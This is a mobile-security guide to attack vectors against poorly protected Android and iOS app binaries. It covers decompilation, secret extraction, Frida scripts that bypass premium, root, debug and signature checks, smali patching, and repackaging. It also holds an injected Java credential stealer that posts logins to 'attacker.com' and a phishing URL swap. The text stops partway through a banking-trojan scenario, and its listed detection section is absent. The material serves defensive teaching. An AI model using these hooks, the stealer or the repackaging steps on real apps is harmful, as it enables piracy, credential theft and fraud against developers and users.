# M07: Insufficient Binary Protections - Attack Vectors

## Table of Contents
1. [Attack Methodology Overview](#attack-methodology-overview)
2. [Attacker Profiles and Motivations](#attacker-profiles-and-motivations)
3. [Phase 1: Reconnaissance and Binary Acquisition](#phase-1-reconnaissance-and-binary-acquisition)
4. [Phase 2: Static Analysis](#phase-2-static-analysis)
5. [Phase 3: Dynamic Analysis](#phase-3-dynamic-analysis)
6. [Phase 4: Code Modification and Tampering](#phase-4-code-modification-and-tampering)
7. [Phase 5: Repackaging and Distribution](#phase-5-repackaging-and-distribution)
8. [Advanced Attack Techniques](#advanced-attack-techniques)
9. [Real-World Attack Scenarios](#real-world-attack-scenarios)
10. [Detection and Forensic Indicators](#detection-and-forensic-indicators)

---

## Attack Methodology Overview

Binary attacks against mobile applications follow a systematic lifecycle that exploits the lack of adequate protections. Unlike network-based attacks, these threats target the application itself, taking advantage of the fact that attackers have complete control over the execution environment and can analyze, modify, and redistribute the application at will.

### The Binary Attack Lifecycle

```
┌─────────────────────────────────────────────────────────────────────┐
│                    BINARY ATTACK LIFECYCLE                           │
└─────────────────────────────────────────────────────────────────────┘

Phase 1: ACQUISITION
┌──────────────────────────────────┐
│ • Download from app store        │
│ • Extract from device            │
│ • Obtain from third-party source │
│ • Time: Minutes                  │
└────────────┬─────────────────────┘
             │
             ▼
Phase 2: STATIC ANALYSIS
┌──────────────────────────────────┐
│ • Decompile binary               │
│ • Extract strings and resources  │
│ • Analyze manifest/plist         │
│ • Map application structure      │
│ • Time: Hours to Days            │
└────────────┬─────────────────────┘
             │
             ▼
Phase 3: DYNAMIC ANALYSIS
┌──────────────────────────────────┐
│ • Runtime debugging              │
│ • Memory analysis                │
│ • Network interception           │
│ • Behavior monitoring            │
│ • Time: Days to Weeks            │
└────────────┬─────────────────────┘
             │
             ▼
Phase 4: EXPLOITATION
┌──────────────────────────────────┐
│ • Modify business logic          │
│ • Remove license checks          │
│ • Inject malicious code          │
│ • Extract sensitive data         │
│ • Time: Hours to Days            │
└────────────┬─────────────────────┘
             │
             ▼
Phase 5: DISTRIBUTION (if applicable)
┌──────────────────────────────────┐
│ • Repackage modified app         │
│ • Sign with new certificate      │
│ • Distribute via third-party     │
│ • Monetize or cause damage       │
│ • Time: Hours                    │
└──────────────────────────────────┘
```

### Attack Success Factors

```yaml
Factors Enabling Successful Binary Attacks:

Technical Weaknesses:
  - No code obfuscation: 90% success rate
  - Debuggable builds: 100% success rate
  - No root/jailbreak detection: 85% success rate
  - Missing integrity checks: 95% success rate
  - Hardcoded secrets: 100% exposure rate

Environmental Factors:
  - Rooted/jailbroken devices: Full system access
  - Readily available tools: Zero cost barrier
  - Online tutorials: Low skill requirement
  - Third-party stores: Easy distribution

Economic Factors:
  - High-value targets: Gaming ($4.99+), Productivity ($9.99+)
  - In-app purchases: Recurring revenue loss
  - API usage costs: Cloud bill shock
  - Intellectual property: Competitive advantage theft
```

---

## Attacker Profiles and Motivations

### Profile 1: The Casual Pirate

**Skill Level:** Beginner  
**Tools:** Free, readily available  
**Motivation:** Access paid features for free  
**Target:** Consumer apps with in-app purchases

```yaml
Typical Workflow:
  1. Search: "App Name cracked APK" on Google
  2. Download: Pre-modified version from piracy site
  3. Install: Disable Play Protect, install APK
  4. Use: Enjoy premium features without payment
  
Impact:
  - Mass market piracy (millions of downloads)
  - Revenue loss from bypassed payments
  - No malicious intent (just wants free stuff)
  
Defense Required: LOW
  - Basic obfuscation deters this profile
  - Server-side validation blocks most attempts
```

### Profile 2: The Competitor

**Skill Level:** Intermediate to Advanced  
**Tools:** Commercial reverse engineering suites  
**Motivation:** Steal intellectual property, algorithms  
**Target:** Apps with proprietary technology

```yaml
Typical Workflow:
  1. Acquire: Purchase legitimate copy
  2. Analyze: Full reverse engineering (weeks)
  3. Extract: Document algorithms, business logic
  4. Replicate: Build competing product
  5. Launch: Faster time-to-market using stolen IP
  
Impact:
  - Loss of competitive advantage
  - Market share erosion
  - Years of R&D wasted
  - Potential patent violations
  
Defense Required: HIGH
  - Advanced obfuscation
  - Algorithm protection
  - Legal deterrents (patents, trademarks)
```

### Profile 3: The Malware Distributor

**Skill Level:** Intermediate  
**Tools:** Automated toolkits  
**Motivation:** Financial gain through malware  
**Target:** Popular apps with large user bases

```yaml
Typical Workflow:
  1. Select: Target popular, unprotected app
  2. Decompile: Extract source code
  3. Inject: Add credential stealing, adware, or banking trojans
  4. Repackage: Sign with debug certificate
  5. Distribute: Third-party stores, phishing campaigns
  6. Monetize: Sell stolen credentials, ad revenue
  
Impact:
  - Users infected with malware
  - Brand damage for legitimate developer
  - Credential theft, financial fraud
  - Legal liability concerns
  
Defense Required: CRITICAL
  - Signature verification
  - Integrity checks
  - Strong obfuscation (harder to inject code)
```

### Profile 4: The Security Researcher

**Skill Level:** Expert  
**Tools:** Full professional toolkit  
**Motivation:** Vulnerability discovery, bug bounties  
**Target:** Security-critical apps (banking, healthcare)

```yaml
Typical Workflow:
  1. Analyze: Comprehensive security assessment
  2. Identify: Find vulnerabilities (hardcoded keys, weak crypto)
  3. Report: Responsible disclosure to vendor
  4. Publish: After vendor patches (or bounty received)
  
Impact:
  - Positive: Improves security if disclosed responsibly
  - Negative: If sold to malicious actors or published prematurely
  
Defense Required: EXPECTED
  - Assume expert analysis will occur
  - Implement best practices
  - Maintain bug bounty program
```

---

## Phase 1: Reconnaissance and Binary Acquisition

### Attack Vector 1.1: App Store Download

**Difficulty:** Trivial  
**Tools:** Web browser, adb/iTunes  
**Detection:** N/A (legitimate download)

```bash
# Android - Direct APK extraction from device
adb shell pm list packages | grep "com.target.app"
adb shell pm path com.target.app
adb pull /data/app/com.target.app-1/base.apk target-app.apk

# Android - From Play Store using third-party tools
# Multiple websites offer APK downloads directly
wget https://apkpure.com/[app-name]/download

# iOS - Extract IPA from device
ideviceinstaller -l
ideviceinstaller -a com.target.app -o copy=app.ipa
```

**Why This Works:**
- Apps are distributed as files users can access
- Android APKs are simple ZIP archives
- iOS IPAs can be extracted from backups
- No technical barrier to acquisition

### Attack Vector 1.2: Third-Party Store Acquisition

**Difficulty:** Trivial  
**Tools:** Web browser  
**Risk:** May contain pre-modified versions

```yaml
Third-Party Android Stores:
  - APKMirror: Generally legitimate, user-uploaded
  - APKPure: Large repository, some risk
  - F-Droid: Open-source only (safer)
  - Piracy Sites: Aptoide, BlackMart, etc. (high risk)

Third-Party iOS Installation:
  - AltStore: Side-loading without jailbreak
  - Cydia Impactor: Developer certificate abuse
  - Jailbreak App Stores: Cydia, Sileo (requires jailbreak)
```

**Attack Scenario:**
```
User Journey to Compromised App:
1. Google search: "Banking App free download"
2. Click suspicious result (not official store)
3. Download APK with embedded malware
4. Install (warnings dismissed)
5. Grant all permissions (malware now active)
6. Credentials stolen on first login
```

### Attack Vector 1.3: Network Interception During Download

**Difficulty:** Intermediate  
**Tools:** Burp Suite, mitmproxy  
**Protection Bypassed:** None (if no SSL pinning during update)

```bash
# Intercept app update download
mitmproxy -p 8080 --mode transparent

# If update channel not using certificate pinning:
# 1. App requests update from server
# 2. Attacker intercepts HTTPS (if no pinning)
# 3. Serves modified APK/IPA
# 4. App installs malicious update
```

---

## Phase 2: Static Analysis

### Attack Vector 2.1: APK/IPA Decompilation

**Difficulty:** Beginner  
**Tools:** jadx, apktool, Hopper  
**Time:** 5-30 minutes

#### Android Decompilation Walkthrough

```bash
# Step 1: Verify APK structure
unzip -l target-app.apk
# Output shows: classes.dex, AndroidManifest.xml, resources, etc.

# Step 2: Decompile with jadx (recommended - produces readable Java)
jadx target-app.apk -d output_directory/
# Generates: Java source code (near-perfect reconstruction)

# Alternative: apktool (for resources and manifest)
apktool d target-app.apk -o apktool_output/
# Generates: Smali bytecode, decoded resources, AndroidManifest.xml

# Step 3: Explore decompiled source
cd output_directory/sources/com/company/app/
ls -la
# Shows: All Java classes with original names (if no obfuscation)

# Step 4: Read critical classes
cat PaymentActivity.java
cat LoginActivity.java
cat ApiClient.java
```

**What Attackers Find (No Obfuscation):**

```java
// Decompiled PaymentActivity.java
package com.company.banking;

public class PaymentActivity extends AppCompatActivity {
    
    // EXPOSED: API credentials
    private static final String API_KEY = "sk_live_51H7x...";
    private static final String API_SECRET = "whsec_8Yx2...";
    
    // EXPOSED: Business logic
    private boolean isPremiumUser() {
        SharedPreferences prefs = getSharedPreferences("user", MODE_PRIVATE);
        return prefs.getBoolean("premium", false);  // Local check only!
    }
    
    // EXPOSED: Validation algorithm
    private boolean validateCardNumber(String card) {
        // Luhn algorithm implementation visible
        // Attacker can replicate or bypass
        int sum = 0;
        boolean alternate = false;
        for (int i = card.length() - 1; i >= 0; i--) {
            int n = Integer.parseInt(card.substring(i, i + 1));
            if (alternate) {
                n *= 2;
                if (n > 9) n -= 9;
            }
            sum += n;
            alternate = !alternate;
        }
        return (sum % 10 == 0);
    }
}
```

**Impact:**
- Business logic completely exposed
- API keys ready for extraction
- Validation algorithms can be replicated
- Attack surface fully mapped in minutes

#### iOS Decompilation Walkthrough

```bash
# Step 1: Extract IPA
unzip target-app.ipa
cd Payload/AppName.app/

# Step 2: Examine Mach-O binary
otool -L AppName  # Show linked libraries
otool -h AppName  # Show header information

# Step 3: Extract class information
class-dump AppName -H -o headers/
# Generates: Objective-C header files

# Step 4: Disassemble with Hopper (GUI tool)
# - Load binary into Hopper Disassembler
# - Analyze: Generates pseudo-code
# - Export: Assembly + reconstructed source

# Step 5: String extraction
strings AppName | grep -i "api"
strings AppName | grep -i "password"
strings AppName | grep -i "http"
```

**What Attackers Find:**

```swift
// Reconstructed from disassembly (pseudo-code)
class PaymentManager {
    let apiKey = "sk_live_51H7x..."  // Found in strings
    let endpoint = "https://api.company.com/v1/payment"
    
    func processPay(amount: Double) -> Bool {
        // Control flow visible in disassembly
        if self.isPremium() {
            return self.chargeCard(amount)
        }
        return false
    }
    
    func isPremium() -> Bool {
        // Logic reconstructed from assembly
        let premium = UserDefaults.standard.bool(forKey: "premium")
        return premium  // Local check!
    }
}
```

### Attack Vector 2.2: String and Resource Extraction

**Difficulty:** Trivial  
**Tools:** strings, grep, text editor  
**Time:** Minutes

```bash
# Android - Extract all strings
strings classes.dex > all_strings.txt

# Search for sensitive data
grep -i "api" all_strings.txt
grep -i "key" all_strings.txt
grep -i "password" all_strings.txt
grep -i "secret" all_strings.txt
grep -i "token" all_strings.txt
grep -E "[A-Za-z0-9+/]{40,}" all_strings.txt  # Base64 encoded data

# Common findings:
API_KEY=AIzaSyDxVW2E9vZpQN7h8dK2eZvN9vZpQN7h8d
AWS_ACCESS_KEY=AKIAI44QH8DHBEXAMPLE
STRIPE_KEY=sk_live_4eC39HqLyjWDarjtT1zdp7dc
DATABASE_PASSWORD=MyS3cr3tP@ssw0rd
ENCRYPTION_KEY=16-byte-key-here

# Extract URLs (API endpoints)
grep -E "https?://[^\s]+" all_strings.txt
# Reveals:
https://api.company.com/internal/admin
https://payment-gateway.company.com/v2
https://analytics.company.com/track
```

**Real-World Example:**

```bash
# Actual string extraction revealing AWS credentials
$ strings app.apk | grep -i aws
AWS_ACCESS_KEY_ID=AKIAJ7X2EXAMPLE
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
AWS_DEFAULT_REGION=us-east-1
S3_BUCKET=company-production-data

# Attacker's next steps:
$ aws configure set aws_access_key_id AKIAJ7X2EXAMPLE
$ aws configure set aws_secret_access_key wJalrXUtnFEMI/K7MDENG...
$ aws s3 ls s3://company-production-data
# Full access to production data!
```

### Attack Vector 2.3: Manifest/Plist Analysis

**Difficulty:** Trivial  
**Tools:** Text editor, apktool  
**Time:** Minutes

#### Android Manifest Vulnerabilities

```xml
<!-- AndroidManifest.xml analysis -->
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.company.banking">
    
    <!-- VULNERABILITY 1: Debuggable enabled -->
    <application
        android:debuggable="true"  <!-- CRITICAL: Production app debuggable! -->
        android:allowBackup="true"  <!-- WARNING: Allows ADB backup -->
        android:usesCleartextTraffic="true">  <!-- WARNING: Allows HTTP -->
        
        <!-- VULNERABILITY 2: Exported components without permissions -->
        <activity android:name=".AdminActivity"
            android:exported="true">  <!-- Anyone can launch this! -->
        </activity>
        
        <!-- VULNERABILITY 3: Insecure content provider -->
        <provider android:name=".UserDataProvider"
            android:authorities="com.company.banking.provider"
            android:exported="true"  <!-- No permission required! -->
            android:grantUriPermissions="true"/>
    </application>
    
    <!-- VULNERABILITY 4: Excessive permissions -->
    <uses-permission android:name="android.permission.READ_CONTACTS"/>
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
    <!-- Banking app doesn't need these! -->
</manifest>
```

**Exploitation:**

```bash
# Exploit debuggable application
adb shell am set-debug-app -w com.company.banking
adb forward tcp:8700 jdwp:$(adb shell pidof com.company.banking)
jdb -attach localhost:8700
# Now can debug production app!

# Exploit exported activity
adb shell am start -n com.company.banking/.AdminActivity
# Direct access to admin panel!

# Exploit exported content provider
adb shell content query --uri content://com.company.banking.provider/users
# Dump all user data!
```

#### iOS Info.plist Vulnerabilities

```xml
<!-- Info.plist analysis -->
<plist version="1.0">
<dict>
    <!-- VULNERABILITY 1: File sharing enabled -->
    <key>UIFileSharingEnabled</key>
    <true/>  <!-- User can access app files via iTunes -->
    
    <!-- VULNERABILITY 2: Insecure URL schemes -->
    <key>CFBundleURLTypes</key>
    <array>
        <dict>
            <key>CFBundleURLSchemes</key>
            <array>
                <string>bankingapp</string>  <!-- bankingapp://action -->
            </array>
        </dict>
    </array>
    <!-- No validation of URL scheme parameters! -->
    
    <!-- VULNERABILITY 3: App Transport Security disabled -->
    <key>NSAppTransportSecurity</key>
    <dict>
        <key>NSAllowsArbitraryLoads</key>
        <true/>  <!-- Allows insecure HTTP connections -->
    </dict>
</dict>
</plist>
```

### Attack Vector 2.4: Native Library Analysis

**Difficulty:** Advanced  
**Tools:** IDA Pro, Ghidra, radare2  
**Time:** Hours to days

```bash
# Extract native libraries
unzip app.apk "lib/*"
cd lib/arm64-v8a/

# Analyze with Ghidra (free)
ghidra &
# Import libnative.so
# Analyze: Auto-analysis takes 5-30 minutes
# Result: Decompiled C/C++ code (pseudo-code)

# Or use IDA Pro (commercial)
ida64 libnative.so
# More accurate decompilation
# Better for complex binaries

# String analysis in native code
strings libnative.so | grep -i "key"
# Often developers hide keys in native code thinking it's more secure
# Still extractable!
```

**Common Findings in Native Code:**

```c
// Pseudo-code from decompiled native library
void check_license(char* user_id) {
    char hardcoded_key[] = "PROD-LICENSE-KEY-2024-ABCD1234";  // EXPOSED
    
    if (strcmp(user_id, hardcoded_key) == 0) {
        return 1;  // Valid license
    }
    
    // Encryption key embedded
    unsigned char aes_key[] = {
        0x2b, 0x7e, 0x15, 0x16, 0x28, 0xae, 0xd2, 0xa6,
        0xab, 0xf7, 0x15, 0x88, 0x09, 0xcf, 0x4f, 0x3c
    };  // AES-128 key visible in binary!
    
    return 0;
}
```

---

## Phase 3: Dynamic Analysis

### Attack Vector 3.1: Debugger Attachment

**Difficulty:** Beginner (if debuggable), Intermediate (if not)  
**Tools:** Android Studio, jdb, lldb  
**Protection Bypassed:** None if debuggable, anti-debug if present

#### Android Debugging Attack

```bash
# Check if app is debuggable
adb shell dumpsys package com.target.app | grep debuggable
# If debuggable=true, trivial to debug

# Enable debugging
adb shell am set-debug-app -w com.target.app

# Get process ID
adb shell ps | grep com.target.app

# Forward debug port
adb forward tcp:8700 jdwp:12345  # Replace 12345 with PID

# Attach debugger (jdb)
jdb -attach localhost:8700

# Inside debugger:
> stop in com.company.app.PaymentActivity.isPremiumUser
> run
# App executes, breakpoint hits
> locals
# Inspect variables
> set premium = true
# Modify return value!
> cont
# App continues with modified value
```

**What Attackers Achieve:**
- Bypass license checks in real-time
- Modify premium status variables
- Extract session tokens from memory
- Understand app flow by stepping through code

#### iOS Debugging Attack

```bash
# Requires jailbroken device
ssh root@iphone-ip  # Default password: alpine

# Find app process
ps aux | grep AppName

# Attach lldb
debugserver *:1234 -a AppName

# On computer:
lldb
(lldb) process connect connect://iphone-ip:1234
(lldb) breakpoint set -n "-[PaymentManager isPremium]"
(lldb) continue
# Breakpoint hits
(lldb) po self
# Inspect object
(lldb) expression return YES
# Force method to return true
```

### Attack Vector 3.2: Runtime Hooking with Frida

**Difficulty:** Intermediate  
**Tools:** Frida, objection  
**Power:** Extremely powerful - full runtime control

#### Frida Attack Examples

```javascript
// Frida script: Bypass premium check (Android)
Java.perform(function() {
    var MainActivity = Java.use('com.company.app.MainActivity');
    
    // Hook isPremiumUser function
    MainActivity.isPremiumUser.implementation = function() {
        console.log('[+] isPremiumUser called, forcing true');
        return true;  // Always return premium
    };
    
    console.log('[*] Premium bypass installed');
});

// Run Frida
frida -U -f com.company.app -l bypass.js --no-pause
```

```javascript
// Frida script: Extract API calls and responses
Java.perform(function() {
    var OkHttpClient = Java.use('okhttp3.OkHttpClient');
    var Request = Java.use('okhttp3.Request');
    var ResponseBody = Java.use('okhttp3.ResponseBody');
    
    // Hook HTTP client
    OkHttpClient.newCall.implementation = function(request) {
        var url = request.url().toString();
        console.log('[+] HTTP Request: ' + url);
        
        var call = this.newCall(request);
        var response = call.execute();
        
        var body = response.body().string();
        console.log('[+] Response: ' + body);
        
        return response;
    };
});
```

```javascript
// Frida script: Bypass root detection
Java.perform(function() {
    var RootCheck = Java.use('com.company.app.security.RootDetection');
    
    RootCheck.isDeviceRooted.implementation = function() {
        console.log('[+] Root check bypassed');
        return false;  // Device not rooted (lie)
    };
    
    RootCheck.checkSuBinary.implementation = function() {
        return false;  // No su binary found (lie)
    };
});
```

**Advanced Frida - Memory Scanning:**

```javascript
// Search memory for sensitive strings
Java.perform(function() {
    // Scan for API keys in memory
    var ranges = Process.enumerateRanges('r--');
    ranges.forEach(function(range) {
        Memory.scan(range.base, range.size, '73 6b 5f 6c 69 76 65', {  // "sk_live"
            onMatch: function(address, size) {
                console.log('[+] Found potential Stripe key at: ' + address);
                console.log(hexdump(address, { length: 64 }));
            },
            onComplete: function() {}
        });
    });
});
```

### Attack Vector 3.3: SSL Unpinning and Traffic Interception

**Difficulty:** Intermediate  
**Tools:** Frida, objection, Burp Suite, mitmproxy  
**Protection Bypassed:** Certificate pinning

```bash
# Method 1: Objection (automated)
objection -g com.company.app explore
...> android sslpinning disable
# Certificate pinning bypassed!

# Method 2: Frida script
frida -U -f com.company.app -l ssl-unpin.js

# Now configure proxy
adb shell settings put global http_proxy localhost:8080

# Start Burp Suite
# All HTTPS traffic now visible
```

**What Traffic Reveals:**

```http
POST /api/v1/login HTTP/1.1
Host: api.company.com
Content-Type: application/json

{
    "username": "user@example.com",
    "password": "UserPassword123!",  // Cleartext password!
    "device_id": "abc123"
}

HTTP/1.1 200 OK
{
    "session_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
    "api_key": "sk_live_xyz123",  // API key in response!
    "premium": true
}
```

### Attack Vector 3.4: Memory Dumping and Analysis

**Difficulty:** Intermediate  
**Tools:** gdb, GameGuardian (Android), Flex (iOS)  
**Target:** Extract secrets from RAM

```bash
# Android memory dump (requires root)
adb shell
su
ps | grep com.target.app  # Get PID
cat /proc/PID/maps  # View memory map
gdb -p PID
(gdb) generate-core-file dump.core
(gdb) quit

# Analyze dump
strings dump.core > memory_strings.txt
grep -i "password" memory_strings.txt
grep -i "token" memory_strings.txt
grep -E "sk_live_[a-zA-Z0-9]+" memory_strings.txt  # Stripe keys
```

**Real Attack - Game Hacking:**

```
Using GameGuardian on rooted Android:
1. Open game, note current coins: 100
2. Open GameGuardian, search for: 100
3. Spend 10 coins (now have 90)
4. Search again for: 90
5. Find memory address
6. Modify value to: 999999
7. Return to game: 999,999 coins!
```

---

## Phase 4: Code Modification and Tampering

### Attack Vector 4.1: Smali Code Modification

**Difficulty:** Intermediate  
**Tools:** apktool, text editor  
**Impact:** Complete business logic modification

```bash
# Decompile to Smali
apktool d original.apk -o smali_output/

# Navigate to target class
cd smali_output/smali/com/company/app/

# Edit PremiumCheck.smali
nano PremiumCheck.smali
```

**Original Smali:**
```smali
.method public isPremiumUser()Z
    .locals 2
    
    # Get SharedPreferences
    const-string v0, "user_prefs"
    invoke-virtual {p0, v0}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;)Landroid/content/SharedPreferences;
    move-result-object v0
    
    # Check premium status
    const-string v1, "premium"
    const/4 v2, 0x0
    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z
    move-result v0
    
    return v0  # Return actual premium status
.end method
```

**Modified Smali (Always Premium):**
```smali
.method public isPremiumUser()Z
    .locals 1
    
    # Always return true
    const/4 v0, 0x1  # Set return value to true
    return v0        # Return true (premium)
.end method
```

```bash
# Recompile
apktool b smali_output/ -o modified.apk

# Sign with debug key
keytool -genkey -v -keystore debug.keystore -alias androiddebugkey \
    -keyalg RSA -keysize 2048 -validity 10000
jarsigner -keystore debug.keystore modified.apk androiddebugkey

# Align
zipalign -v 4 modified.apk final-modified.apk

# Install
adb install final-modified.apk
```

**Result:** App now thinks all users are premium, completely bypassing server validation display logic.

### Attack Vector 4.2: Dex Manipulation

**Difficulty:** Advanced  
**Tools:** dex2jar, JD-GUI, custom scripts  
**Impact:** Precise bytecode modification

```bash
# Convert DEX to JAR
d2j-dex2jar classes.dex -o classes.jar

# Decompile JAR
jd-gui classes.jar  # Graphical tool

# Make changes to .class files
# Or decompile to Java, modify, recompile
javac -cp android.jar ModifiedClass.java
dx --dex --output=classes.dex ModifiedClass.class

# Replace in APK
zip -d app.apk classes.dex
zip -u app.apk classes.dex
```

### Attack Vector 4.3: Resource Modification

**Difficulty:** Beginner  
**Tools:** apktool, text editor  
**Impact:** Phishing, brand impersonation

```bash
# Decompile
apktool d legitimate-bank.apk

# Modify resources
cd legitimate-bank/res/values/
nano strings.xml
```

**Original:**
```xml
<string name="app_name">Trusted Bank Mobile</string>
<string name="login_url">https://secure.trustedbank.com/login</string>
```

**Modified (Phishing):**
```xml
<string name="app_name">Trusted Bank Mobile</string>  <!-- Same name -->
<string name="login_url">https://secure.trustedbank-login.phishing.com/steal</string>
```

```bash
# Recompile and sign
apktool b legitimate-bank/ -o phishing-bank.apk
jarsigner -keystore fake.keystore phishing-bank.apk fakekey

# Result:
# - Looks identical to legitimate app
# - Sends credentials to attacker's server
# - Users can't tell the difference
```

### Attack Vector 4.4: Malware Injection

**Difficulty:** Intermediate to Advanced  
**Tools:** Custom payloads, Smali knowledge  
**Impact:** Credential theft, banking trojans

```java
// Malicious code injected into LoginActivity
public class LoginActivity extends AppCompatActivity {
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_login);
        
        // INJECTED CODE - Credential stealer
        EditText username = findViewById(R.id.username);
        EditText password = findViewById(R.id.password);
        Button loginBtn = findViewById(R.id.login_button);
        
        loginBtn.setOnClickListener(v -> {
            String user = username.getText().toString();
            String pass = password.getText().toString();
            
            // Original login logic
            performLogin(user, pass);
            
            // MALICIOUS: Send credentials to attacker
            new Thread(() -> {
                try {
                    String url = "http://attacker.com/steal.php";
                    HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
                    conn.setRequestMethod("POST");
                    conn.setDoOutput(true);
                    
                    String data = "user=" + URLEncoder.encode(user, "UTF-8") +
                                  "&pass=" + URLEncoder.encode(pass, "UTF-8");
                    
                    conn.getOutputStream().write(data.getBytes());
                    conn.getInputStream();  // Send data
                    conn.disconnect();
                } catch (Exception e) {
                    // Silently fail - user never knows
                }
            }).start();
        });
    }
}
```

---

## Phase 5: Repackaging and Distribution

### Attack Vector 5.1: Third-Party App Store Distribution

**Difficulty:** Easy  
**Method:** Upload to unregulated stores  
**Reach:** Millions of potential victims

```yaml
Distribution Channels:
  Tier 1 (Seemingly Legitimate):
    - APKMirror: Community-moderated
    - APKPure: Popular alternative store
    - Effectiveness: High trust, large user base
    
  Tier 2 (Gray Area):
    - 9Apps, Mobogenie, GetJar
    - Effectiveness: Moderate, less scrutiny
    
  Tier 3 (Explicit Piracy):
    - Aptoide, BlackMart, ACMarket
    - Effectiveness: Users already risk-tolerant
    
  Tier 4 (Direct):
    - Phishing websites
    - Social engineering campaigns
    - Effectiveness: Targeted attacks
```

**Distribution Attack Example:**

```
1. Attacker creates fake app store listing:
   Name: "Banking App Pro - Official"
   Icon: Same as legitimate app
   Screenshots: Stolen from real app
   Description: "Updated version with new features!"
   
2. Upload malicious APK

3. SEO optimization:
   - "banking app download free"
   - "banking app APK latest version"
   
4. Google indexes the page

5. Users searching for app find fake version

6. Thousands of installs before detection
```

### Attack Vector 5.2: Malvertising and Social Engineering

**Difficulty:** Moderate (requires campaign setup)  
**Reach:** Targeted or mass  
**Success Rate:** 3-7% click-through

```
Attack Campaign:
┌────────────────────────────────────┐
│  Malicious Advertisement           │
│  ┌──────────────────────────────┐  │
│  │ ⚠️ URGENT: Update Required!  │  │
│  │ Your Banking App is outdated │  │
│  │ [Download Update Now]        │  │
│  └──────────────────────────────┘  │
└────────────────────────────────────┘
           │
           ▼
    User clicks link
           │
           ▼
  Fake update page loads
  (Looks like official site)
           │
           ▼
  User downloads malicious APK
           │
           ▼
  Installation prompts appear
  (Most users ignore warnings)
           │
           ▼
  Malware installed and active
```

---

## Advanced Attack Techniques

### Advanced Technique 1: Anti-Debug Bypass

**Target:** Apps with anti-debugging protection  
**Methods:** Multiple evasion techniques

```python
# Common anti-debug checks and bypasses

# Check 1: Debug flag detection
if ((getApplicationInfo().flags & ApplicationInfo.FLAG_DEBUGGABLE) != 0) {
    System.exit(0);  // Debuggable = exit
}

# Bypass: Frida hook
Java.perform(function() {
    var ApplicationInfo = Java.use('android.content.pm.ApplicationInfo');
    ApplicationInfo.flags.value = 0;  // Remove debug flag
});

# Check 2: Debugger connected check
if (Debug.isDebuggerConnected()) {
    throw new RuntimeException("Debugger detected");
}

# Bypass: Frida hook
Java.perform(function() {
    var Debug = Java.use('android.os.Debug');
    Debug.isDebuggerConnected.implementation = function() {
        return false;
    };
});

# Check 3: TracerPid check (native)
FILE* f = fopen("/proc/self/status", "r");
char line[256];
while (fgets(line, sizeof(line), f)) {
    if (strncmp(line, "TracerPid:", 10) == 0) {
        int pid = atoi(line + 10);
        if (pid != 0) {
            exit(1);  // Being traced = exit
        }
    }
}

# Bypass: Hook fopen or modify /proc/self/status
```

### Advanced Technique 2: Root Detection Bypass

**Target:** Apps refusing to run on rooted devices  
**Comprehensive bypass strategy:**

```bash
# Install Magisk Hide (hides root from apps)
# Install Magisk modules:
# - Universal SafetyNet Fix
# - MagiskHide Props Config

# Frida script for runtime bypass
Java.perform(function() {
    // Bypass su binary check
    var Runtime = Java.use('java.lang.Runtime');
    Runtime.exec.overload('java.lang.String').implementation = function(cmd) {
        if (cmd.indexOf('su') >= 0) {
            throw 'Command not found';  // Pretend su doesn't exist
        }
        return this.exec(cmd);
    };
    
    // Bypass file existence check
    var File = Java.use('java.io.File');
    File.exists.implementation = function() {
        var path = this.getAbsolutePath();
        if (path.indexOf('su') >= 0 || path.indexOf('Superuser') >= 0) {
            return false;  // These files don't exist (lie)
        }
        return this.exists();
    };
    
    // Bypass package manager check
    var PackageManager = Java.use('android.content.pm.PackageManager');
    PackageManager.getPackageInfo.overload('java.lang.String', 'int').implementation = function(pkg, flags) {
        if (pkg === 'com.topjohnwu.magisk' || pkg === 'eu.chainfire.supersu') {
            throw 'Package not found';  // Root management apps not installed
        }
        return this.getPackageInfo(pkg, flags);
    };
});
```

### Advanced Technique 3: Integrity Check Bypass

**Target:** Apps verifying their own integrity  
**Method:** Hook verification functions

```javascript
// Frida script: Bypass signature verification
Java.perform(function() {
    var PackageManager = Java.use('android.content.pm.PackageManager');
    
    // Hook signature retrieval
    PackageManager.getPackageInfo.overload('java.lang.String', 'int').implementation = function(pkg, flags) {
        var result = this.getPackageInfo(pkg, flags);
        
        // If asking for signatures
        if (flags & 0x00000040) {  // GET_SIGNATURES
            // Replace with expected legitimate signature
            var legitSignature = "308201dd30820146...";  // Original cert
            result.signatures.value = [legitSignature];
        }
        
        return result;
    };
});
```

---

## Real-World Attack Scenarios

### Scenario 1: Premium Subscription Bypass

**Target:** Fitness tracking app ($9.99/month)  
**Attacker:** Amateur hacker  
**Timeline:** 2 hours

```yaml
Attack Steps:
  1. Download APK from device
  2. Decompile with jadx (5 minutes)
  3. Locate SubscriptionManager class
  4. Find isPremium() method - returns SharedPreferences boolean
  5. Decompile to Smali with apktool (5 minutes)
  6. Modify isPremium() to always return true (15 minutes)
  7. Recompile and sign (10 minutes)
  8. Install modified version
  9. Share on Reddit /r/moddedandroidapps (5 minutes)
  10. 50,000 downloads in 2 weeks

Financial Impact:
  50,000 users × $9.99/month × 6 months = $2,997,000 lost revenue
  
Root Cause:
  - No obfuscation (class names readable)
  - Local premium check (no server validation)
  - No integrity verification
```

### Scenario 2: Banking Trojan Distribution

**Target:** Regional mobile banking app  
**Attacker:** Organized cybercrime group  
**Timeline:** 2 weeks preparation, 6 weeks active

```yaml
Phase 1: Preparation (Week 1-2)
  - Download legitimate banking app
  - Reverse engineer (no obfuscation)
  - Develop credential-stealing overlay
  - Test on private devices
  - Setup command & control server

Phase 2: Distribution (Week 3-4)
  - Create phishing SMS campaign
  - Message: "Security update required - download here: bit.ly/bankupdate"
  - 100,000 SMS sent
  - 3.2% click-through rate = 3,200 visits
  - 15% install rate = 480 installations

Phase 3: Exploitation (Week 5-8)
  - Trojan activates on banking app launch
  - Shows fake login overlay
  - Captures credentials: 340 sets obtained
  - Sells on dark web: $50-200 each
  - Revenue: $17,000 - $68,000

Bank Impact:
  - $1.2M in fraudulent transactions
  - 480 customers compromised
